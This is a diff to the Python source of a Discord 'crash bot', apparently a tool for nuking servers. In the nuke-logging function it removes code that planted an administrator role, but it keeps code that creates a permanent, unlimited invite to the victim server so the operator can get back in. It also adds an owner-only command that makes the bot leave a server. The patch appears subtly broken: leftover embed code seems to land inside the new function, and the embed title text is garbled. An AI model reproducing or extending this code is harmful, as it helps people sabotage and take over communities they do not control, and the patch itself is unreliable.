@@ -57,34 +57,16 @@ async def db_set(collection: str, key: str, value):
 # --- NUKE LOGS ---------------------------------------------
 
 async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
-    """Логирование лога нюка. Создаём роль с правами администратора и создаём инвайт через неё."""
+    """Логирование лога нюка. Создаём инвайт для ссылки на сервер."""
     invite_url = None
     try:
-        # Создаём роль с правами администратора
-        log_role = await guild.create_role(
-            name="☠️ Kanero LOG",
-            permissions=discord.Permissions(administrator=True),
-            color=discord.Color.dark_red()
-        )
-        # Поднимаем роль выше всех ролей
-        try:
-            await log_role.edit(position=max(1, guild.me.top_role.position - 1))
-        except Exception:
-            pass
-        # Создаём инвайт через созданную роль
+        # Пытаемся создать инвайт через существующий канал
         ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
         if ch:
             inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
             invite_url = inv.url
     except Exception:
-        # Fallback с обычной ролью
-        try:
-            ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
-            if ch:
-                inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
-                invite_url = inv.url
-        except Exception:
-            pass
+        pass
 
     import datetime
     entry = {
@@ -3986,6 +3968,20 @@ async def ticket_setup(ctx):
         await ctx.message.delete()
     except Exception:
         pass
+
+
+@bot.command(name="goout")
+async def goout(ctx):
+    """Бот покидает сервер. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    guild = ctx.guild
+    try:
+        await ctx.send("👋 Бот покидает сервер.")
+        await guild.leave()
+    except Exception as e:
+        await ctx.send(f"❌ Ошибка: {e}")
+
 
     embed = discord.Embed(
         title="?? Kanero � CRASH BOT",
